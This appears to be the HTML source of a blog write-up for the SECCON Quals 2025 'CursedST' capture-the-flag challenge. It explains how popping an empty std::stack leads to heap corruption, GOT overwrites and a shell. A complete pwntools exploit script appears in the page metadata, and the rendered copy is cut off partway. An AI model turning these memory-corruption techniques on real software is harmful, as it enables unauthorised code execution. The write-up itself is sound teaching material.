@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Seccon Quals 2025 - CursedST | leo_something</title>
+<meta name="keywords" content="heap, c&#43;&#43;">
+<meta name="description" content="Pop on an empty std::stack?!">
+<meta name="author" content="leo_something &amp; Lotus">
+<link rel="canonical" href="http://leo1.cc/posts/writeups/seccon25-cursedst/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.62bb6a5e71ed8590b51185096e2d3dea8379889277e03fcf9ef8a01b0f6d9dc0.css" integrity="sha256-YrtqXnHthZC1EYUJbi096oN5iJJ34D/PnvigGw9tncA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc/posts/writeups/seccon25-cursedst/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc/posts/writeups/seccon25-cursedst/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="Seccon Quals 2025 - CursedST">
+  <meta property="og:description" content="Pop on an empty std::stack?!">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-17T09:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-17T09:00:00+00:00">
+    <meta property="article:tag" content="Heap">
+    <meta property="article:tag" content="C&#43;&#43;">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Seccon Quals 2025 - CursedST">
+<meta name="twitter:description" content="Pop on an empty std::stack?!">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Seccon Quals 2025 - CursedST",
+      "item": "http://leo1.cc/posts/writeups/seccon25-cursedst/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Seccon Quals 2025 - CursedST",
+  "name": "Seccon Quals 2025 - CursedST",
+  "description": "Pop on an empty std::stack?!",
+  "keywords": [
+    "heap", "c++"
+  ],
+  "articleBody": "Overview The challenge consists in a simple C++ binary that let’s you push and pop unsigned longs on two std::stacks named S and T. At startup you can also provide a name that is then printed (this will be useful to leak).\n#include #include std::string name; std::stack\u003csize_t\u003e S, T; int main() { size_t op, val; std::cout \u003c\u003c \"What's your name?\" \u003c\u003c std::endl; std::cin \u003e\u003e name; std::cout \u003c\u003c \"Hello, \" \u003c\u003c name \u003c\u003c \"!\" \u003c\u003c std::endl; while (std::cin.good()) { std::cin \u003e\u003e op; if (op == 1) { std::cin \u003e\u003e val; S.push(val); } else if (op == 2) { S.pop(); } else if (op == 3) { std::cin \u003e\u003e val; T.push(val); } else if (op == 4) { T.pop(); } else { break; } } return 0; } Vulnerability We can pop even if a stack is empty. To exploit this we need to deep dive into how a std::stack is implemented.\nstruct stack // sizeof=0x50 { void **_M_map; size_t _M_map_size; struct iterator _M_start; struct iterator _M_finish; }; struct iterator // sizeof=0x20 { void *_M_cur; void *_M_first; void *_M_last; void **_M_node; }; Things to notice:\nNodes are arrays of size 0x200 that contain the actual data you push on the stack There are two iterators because a std::stack is basically a std::deque. _M_start doesn’t usually move (we didn’t actually deep dive into that tho) and _M_finish is the actual cursor that keeps track of the top of the stack. _M_node points at the node pointer inside _M_map _M_map is a dynamic array of node pointers The first node pointer is put at the center of the map (probably useful for deques) If a node is full, another one gets allocated and the pointer put after the last one in the map If a node is empty it’s freed and the current node becomes the previous one If a map is full (\u003c2 slots remaining) it’s reallocated If we pop stuff from an empty stack we trigger point 4.3 in the list above, but as there are no previous nodes in the map, the finish iterator will then point to whatever value is present in the map before the pointer to the first node. That value is usually zero, so if we try to push or pop more stuff in that stack the program crashes.\nExploitation NOTE: The program is compiled with Partial RELRO and No PIE.\nTo exploit this vulnerability we need to somehow put a valid pointer in the map. The name is a std::string, this object is constantly reallocated when more data is put into it. This implies that if we send a huge name we will trigger some frees on chunks containing our data. In this way we can spray the heap with pointers, when a big chunk containing part of our name (pointers) gets freed it is put into the unsorted bin free-list, so we can trigger the reallocation of the map and have it allocated from the unsorted bin, keeping the memory inside it uninitialized. With this trick we can control a node pointer and achieve one write to an arbitrary location. We can use this write to override the _M_finish struct of the other stack, achieving finally arbitrary write.\nWith the arbitrary write we change the pointer to the string stored inside name, to make it point at the GOT entry of __cxa_atexit (which contains a libc pointer). Now we override the GOT entry of operator delete[] to make it point to main+95 (which is where the name is printed). operator delete[] is called inside the exit handlers so, upon exit, the program restarts and we get a libc leak. Now we can override the GOT entry of std::basic_istream with a one-gadget and get RCE.\nFinal Exploit #!/bin/env python3 import sys from pwn import context, ELF, args, remote, process, gdb, p64, info, success, u64, pause # # INIT # context.terminal = [\"alacritty\", \"--working-directory\", \"./\", \"-e\"] elf = context.binary = ELF(\"./st_patched\", False) libc = ELF(\"./libs/libc.so.6\", False) libcpp = ELF(\"./libs/libstdc++.so.6\", False) gs = \"\"\" continue \"\"\" def start(argv): if args.REMOTE: if len(argv) != 2: print(f\"Usage:\\t{argv[0]} : REMOTE\") exit(-1) (IP, PORT) = argv[1].split(\":\") return remote(IP, int(PORT)) elif args.GDB: return gdb.debug(elf.path, gs, aslr=True) else: return process(elf.path) # # UTILS # ONE_GADGET = 0x583f3 # # FUNCTIONS # def s_push(val): io.sendline(b\"1\") io.sendline(str(val).encode()) def s_pop(): io.sendline(b\"2\") def t_push(val): io.sendline(b\"3\") io.sendline(str(val).encode()) def t_pop(): io.sendline(b\"4\") # # EXPLOIT # def main(argv): global io io = start(argv) # heap spray name = p64(elf.sym[\"T\"]) * 0x100 io.sendlineafter(b\"?\\n\", name) for _ in range(5): for i in range(64): s_push(0xdeadbeefcafe0000 + 0x30 + i) for _ in range(5): for i in range(64): s_pop() # Now S.finish points to T s_pop() # Getting curr on top of T for _ in range(57): s_pop() info(f\"Target __cxa_atexit: {hex(elf.got['__cxa_atexit'])}\") # T.finish.cur s_push(elf.got['__cxa_atexit']+0x20) # operator delete # T.finish.first s_push(elf.got['__cxa_atexit']-0x20) # T.finish.last s_push(elf.got['__cxa_atexit']-0x20+0x1000) # Overwrite __cxa_atexit t_push(elf.sym[\"main\"]+95) # Overlap T with name for _ in range(3): s_pop() s_push(elf.sym[\"_Z4nameB5cxx11\"]) # Overwrite name t_push(elf.got['__cxa_atexit']) io.sendline(b\"0\") io.recvuntil(b\"Hello, \") io.recvuntil(b\"Hello, \") libc_leak = u64(io.recv(8)) success(f\"libc leak: {hex(libc_leak)}\") libc.address = libc_leak - 0x471f0 s_pop() # T.finish.cur s_push(elf.got['__cxa_atexit']+0x48) # ios_good # T.finish.first s_push(elf.got['__cxa_atexit']-0x20) # T.finish.last s_push(elf.got['__cxa_atexit']-0x20+0x1000) for i in range(9): s_pop() s_push(0) t_push(libc.address + ONE_GADGET) io.interactive() if __name__ == \"__main__\": sys.exit(main(sys.argv)) FLAG: SECCON{y0u_uNd3Rs74nd_H0w_t0_3xpLo1t_tH3_\"stack\"}\n",
+  "wordCount" : "864",
+  "inLanguage": "en",
+  "datePublished": "2025-12-17T09:00:00Z",
+  "dateModified": "2025-12-17T09:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something \u0026 Lotus"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc/posts/writeups/seccon25-cursedst/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Seccon Quals 2025 - CursedST
+    </h1>
+    <div class="post-meta"><span title='2025-12-17 09:00:00 +0000 UTC'>December 17, 2025</span>&nbsp;·&nbsp;leo_something &amp; Lotus
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/heap" class="custom-tag">
+        heap
+      </a>
+      
+      <a href="/tags/c&#43;&#43;" class="custom-tag">
+        c&#43;&#43;
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#final-exploit" aria-label="Final Exploit">Final Exploit</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>The challenge consists in a simple C++ binary that let&rsquo;s you push and pop <code>unsigned long</code>s on two <code>std::stack</code>s named <code>S</code> and <code>T</code>. At startup you can also provide a name that is then printed (this will be useful to leak).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stack&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string name;
+</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>stack<span style="color:#f92672">&lt;</span>size_t<span style="color:#f92672">&gt;</span> S, T;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  size_t op, val;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;What&#39;s your name?&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> name;
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Hello, &#34;</span> <span style="color:#f92672">&lt;&lt;</span> name <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (std<span style="color:#f92672">::</span>cin.good()) {
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> op;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (op <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> val;
+</span></span><span style="display:flex;"><span>      S.push(val);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (op <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>      S.pop();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (op <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>      std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> val;
+</span></span><span style="display:flex;"><span>      T.push(val);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (op <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) {
+</span></span><span style="display:flex;"><span>      T.pop();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h2>
+<p>We can pop even if a stack is empty. To exploit this we need to deep dive into how a <code>std::stack</code> is implemented.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> stack <span style="color:#75715e">// sizeof=0x50
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>_M_map;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> _M_map_size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> iterator _M_start;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> iterator _M_finish;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> iterator <span style="color:#75715e">// sizeof=0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{   
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>_M_cur;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>_M_first;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>_M_last;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>_M_node;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Things to notice:</p>
+<ol>
+<li>Nodes are arrays of size 0x200 that contain the actual data you push on the stack</li>
+<li>There are two iterators because a <code>std::stack</code> is basically a <code>std::deque</code>. <code>_M_start</code> doesn&rsquo;t usually move (we didn&rsquo;t actually deep dive into that tho) and <code>_M_finish</code> is the actual cursor that keeps track of the top of the stack.</li>
+<li><code>_M_node</code> points at the node pointer inside <code>_M_map</code></li>
+<li><code>_M_map</code> is a dynamic array of node pointers
+<ol>
+<li>The first node pointer is put at the center of the map (probably useful for deques)</li>
+<li>If a node is full, another one gets allocated and the pointer put after the last one in the map</li>
+<li>If a node is empty it&rsquo;s freed and the current node becomes the previous one</li>
+<li>If a map is full (&lt;2 slots remaining) it&rsquo;s reallocated</li>
+</ol>
+</li>
+</ol>
+<p>If we pop stuff from an empty stack we trigger point <code>4.3</code> in the list above, but as there are no previous nodes in the map, the finish iterator will then point to whatever value is present in the map before the pointer to the first node. That value is usually zero, so if we try to push or pop more stuff in that stack the program crashes.</p>
+<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p><strong>NOTE:</strong> The program is compiled with <code>Partial RELRO</code> and <code>No PIE</code>.</p>
+<p>To exploit this vulnerability we need to somehow put a valid pointer in the map.
+The name is a <code>std::string</code>, this object is constantly reallocated when more data is put into it. This implies that if we send a huge name we will trigger some frees on chunks containing our data. In this way we can spray the heap with pointers, when a big chunk containing part of our name (pointers) gets freed it is put into the unsorted bin free-list, so we can trigger the reallocation of the map and have it allocated from the unsorted bin, keeping the memory inside it uninitialized.
+With this trick we can control a node pointer and achieve one write to an arbitrary location.
+We can use this write to override the <code>_M_finish</code> struct of the other stack, achieving finally arbitrary write.</p>
+<p>With the arbitrary write we change the pointer to the string stored inside <code>name</code>, to make it point at the GOT entry of <code>__cxa_atexit</code> (which contains a libc pointer).
+Now we override the GOT entry of <code>operator delete[]</code> to make it point to <code>main+95</code> (which is where the name is printed). <code>operator delete[]</code> is called inside the exit handlers so, upon exit, the program restarts and we get a libc leak. Now we can override the GOT entry of <code>std::basic_istream</code> with a one-gadget and get RCE.</p>
+<h3 id="final-exploit">Final Exploit<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> context, ELF, args, remote, process, gdb, p64, info, success, u64, pause
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># INIT</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;--working-directory&#34;</span>, <span style="color:#e6db74">&#34;./&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./st_patched&#34;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libs/libc.so.6&#34;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libcpp <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libs/libstdc++.so.6&#34;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>gs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Usage:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">{</span>argv[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> &lt;IP&gt;:&lt;PORT&gt; REMOTE&#34;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        (IP, PORT) <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(IP, int(PORT))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(elf<span style="color:#f92672">.</span>path, gs, aslr<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process(elf<span style="color:#f92672">.</span>path)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># UTILS</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>ONE_GADGET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x583f3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># FUNCTIONS</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">s_push</span>(val):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(val)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">s_pop</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">t_push</span>(val):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(val)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">t_pop</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># EXPLOIT</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(argv):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> io
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> start(argv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># heap spray</span>
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;T&#34;</span>]) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
+</span></span><span style="display:flex;"><span>            s_push(<span style="color:#ae81ff">0xdeadbeefcafe0000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span> <span style="color:#f92672">+</span> i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
+</span></span><span style="display:flex;"><span>            s_pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now S.finish points to T</span>
+</span></span><span style="display:flex;"><span>    s_pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Getting curr on top of T</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">57</span>):
+</span></span><span style="display:flex;"><span>        s_pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Target __cxa_atexit: </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># T.finish.cur</span>
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>) <span style="color:#75715e"># operator delete</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># T.finish.first</span>
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>)
